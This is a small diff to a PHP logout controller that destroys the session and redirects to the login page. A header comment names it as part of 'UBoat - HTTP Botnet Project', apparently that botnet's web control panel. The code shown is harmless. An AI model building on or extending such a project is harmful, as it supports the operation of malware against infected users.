@@ -1,13 +1,12 @@
 <?php
+
 /**
- * Created by PhpStorm.
- * User: Ben
- * Date: 1/25/2016
- * Time: 2:34 PM
+ * This file is part of UBoat - HTTP Botnet Project
  */
+
 class Logout extends Controller
 {
-    function index()
+    public function index()
     {
         session_destroy();
         $this->redirect('login');
